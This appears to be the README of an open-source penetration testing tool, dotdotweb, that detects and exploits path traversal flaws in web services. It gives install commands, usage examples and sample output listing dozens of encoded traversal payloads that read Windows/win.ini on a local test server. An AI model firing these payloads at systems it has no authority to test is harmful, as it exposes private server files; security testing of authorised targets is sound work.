dotdotfarm
==========

![Version](https://img.shields.io/badge/version-1.7.2-blue?style=for-the-badge)

Utility for detection & exploitation of Path Traversal vulnerabilities in various network services

dotdotweb - PT tool for HTTP services


Tools are written in Python with using asyncio requests (aiohttp) with some acceleration techniques, which allows you to make up to ~3K requests per second

Features
--------
- using asynchronous requests for increasing scan of target
- ability to fetch files' content after succeeding a payload
- specifying payload in any part of query (URL, headers or POST data)
- using callbacks for handling of results

Installation
============
Install from PyPi
```bash
pip install dotdotfarm
```
You can also install it directly from GitHub repository
```bash
git clone https://github.com/treddis/dotdotfarm.git
cd dotdotfarm
pip3 install .
```
To upgrade tool run
```bash
pip install --upgrade dotdotfarm
```

Usage
=====
```text

    .___      __      .___      __    _____                      
  __| _/_____/  |_  __| _/_____/  |__/ ____\____ _______  _____  
 / __ |/  _ \   __\/ __ |/  _ \   __\   __\\__  \\_  __ \/     \ 
/ /_/ (  <_> )  | / /_/ (  <_> )  |  |  |   / __ \|  | \/  Y Y  \
\____ |\____/|__| \____ |\____/|__|  |__|  (____  /__|  |__|_|  /
     \/                \/                       \/            \/ 
     
usage: dotdotweb [-h] [--version] [-V] [-A] [-R] [-o {windows,linux}]
                 [-d DEPTH] [-f FILE] [--delay DELAY]
                 [-t TIMEOUT] [-fs FS] [-fc FC] [--header HEADERS] [--data DATA]
                 url

fast path traversal identificator & exploit

positional arguments:
  url                   target URL

options:
  -h, --help            show this help message and exit
  --version             print version of the tool
  -V, --validate        validate files' content after successfull exploitation
                            (default false)
  -A, --all             try all files after successfull exploitation
                            (default false)
  -R, --print-files     read traversed files (default false)
  -o {windows,linux}, --os-type {windows,linux}
                        target OS type (default all)
  -d DEPTH, --depth DEPTH
                        depth of PT searching (default 5)
  -f FILE, --file FILE  specific file for PT detection
  --delay DELAY         make delays between requests in milliseconds (default 0)
  -t TIMEOUT, --timeout TIMEOUT
                        timeout of connections (default 60)
  -fs FS                filter output by size
  -fc FC                filter output by response code
  --header HEADERS      custom header for requests
  --data DATA           specify POST data
```

### Passing payload in GET parameters
Passing brute parameters via `?par=val` pairs:
```text
dotdotweb -o windows -fc 500 \ 
          http://someserver.com:1280/newpath?testparameter=FUZZ&secondparameter=somevalue
```

### Passing payload in headers
Passing brute parameters via `Origin: master=FUZZ` pairs:
```text
dotdotweb -o linux -fc 500,404 -H "Referer: https://www.google.com/path?q=FUZZ" \
          http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
```

### Passing payload in POST data
Passing brute parameters via POST data parameters
```text
dotdotweb -o linux -fc 500 -fs 111 -d "key0=val0&key1=val1" \
          http://someserver.com:1280/newpath?testparameter=firstvalue&secondparameter=somevalue
```

### Using regexp to filter responses
Pass -fs (filter by size) or -fc (filter by status code) to filter out not related responses
```text
dotdotweb -fc 50*,4* -fs 18??,1834* http://someserver.com:1234/testpath/FUZZ
```

### Launch callbacks on responses
You can launch callbacks on your responses to perform some check or make other actions.
In the box implemented callbacks:
- validate response content using regexp and print then (-V). You can pass your regexp too!
- try all payloads even entry point is found (-A)
- read traversed files content and print them on screen (-P)

Example output
==============
```text
dotdotweb -o windows "http://localhost:8080/pathtrav?query=FUZZ" 

    .___      __      .___      __    _____
  __| _/_____/  |_  __| _/_____/  |__/ ____\____ _______  _____
 / __ |/  _ \   __\/ __ |/  _ \   __\   __\\__  \\_  __ \/     \
/ /_/ (  <_> )  | / /_/ (  <_> )  |  |  |   / __ \|  | \/  Y Y  \
\____ |\____/|__| \____ |\____/|__|  |__|  (____  /__|  |__|_|  /
     \/                \/                       \/            \/

[*] Started at Sun Jan 22 19:32:46 2023
 ../../../Windows/win.ini                                                   [Status: 200, Size: 111]
 ../Windows/win.ini                                                         [Status: 200, Size: 111]
 ..\Windows\win.ini                                                         [Status: 200, Size: 111]
 ..%2fWindows%2fwin.ini                                                     [Status: 200, Size: 111]
 ..\..\..\Windows\win.ini                                                   [Status: 200, Size: 111]
 ..%5c..%5c..%5cWindows%5cwin.ini                                           [Status: 200, Size: 111]
 ..%5cWindows%5cwin.ini                                                     [Status: 200, Size: 111]
 .%2e/Windows/win.ini                                                       [Status: 200, Size: 111]
 .%2e\Windows\win.ini                                                       [Status: 200, Size: 111]
 .%2e%2fWindows%2fwin.ini                                                   [Status: 200, Size: 111]
 .%2e%5cWindows%5cwin.ini                                                   [Status: 200, Size: 111]
 %5C..%5cWindows%5cwin.ini                                                  [Status: 200, Size: 111]
 f%5C..%2fWindows%2fwin.ini                                                 [Status: 200, Size: 111]
 %5C../Windows/win.ini                                                      [Status: 200, Size: 111]
 %5C..\%5C..\%5C..\Windows\win.ini                                          [Status: 200, Size: 111]
 .%2e\.%2e\.%2e\Windows\win.ini                                             [Status: 200, Size: 111]
 .%2e%5c.%2e%5c.%2e%5cWindows%5cwin.ini                                     [Status: 200, Size: 111]
 %5C..%2f%5C..%2f%5C..%2fWindows%2fwin.ini                                  [Status: 200, Size: 111]
 %5C../%5C../%5C../Windows/win.ini                                          [Status: 200, Size: 111]
 %5C..%5c%5C..%5c%5C..%5cWindows%5cwin.ini                                  [Status: 200, Size: 111]
 %2e./Windows/win.ini                                                       [Status: 200, Size: 111]
 %2e./%2e./%2e./Windows/win.ini                                             [Status: 200, Size: 111]
 %2e.%5cWindows%5cwin.ini                                                   [Status: 200, Size: 111]
 %2e.%5c%2e.%5c%2e.%5cWindows%5cwin.ini                                     [Status: 200, Size: 111]
 .%2e%2f.%2e%2f.%2e%2fWindows%2fwin.ini                                     [Status: 200, Size: 111]
100%|██████████████████████████████████████████████████████████| 6960/6960 [00:12<00:00, 575.63it/s]
[*] Ended at Sun Jan 22 19:32:58 2023 (11 seconds)
```
